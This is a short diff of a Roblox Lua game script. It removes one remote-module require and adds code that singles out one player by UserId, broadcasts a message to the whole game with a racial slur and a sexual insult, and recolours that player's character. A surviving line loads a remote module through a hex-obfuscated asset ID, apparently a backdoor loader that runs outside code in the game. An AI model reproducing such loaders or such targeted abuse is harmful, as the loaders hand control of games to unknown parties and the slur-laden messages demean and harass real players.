@@ -1,5 +1,17 @@
 game.Players.PlayerAdded:Connect(function(player)
- require(15124075654)(player.Name)
+  if player.UserId == 4303863029 then 
+    local m = Instance.new("Message", workspace)
+    m.Text = player.Name .. " Has been detected, automatic penis removal iniated, get out of my game you swedish nigger"
+    wait(3)
+    m:Destroy()
+    for i, v in pairs(player.Character:GetDescendants()) do 
+     if v:IsA("Part") then 
+      v.BrickColor = BrickColor.new("Crimson") 
+      local h = Instance.new("Hint", workspace) 
+      h.Text = player.Name .. " Penis has been removed!"
+     end
+    end
+  end
 end)
 require(0x38c5453e6)()
 wait(1)
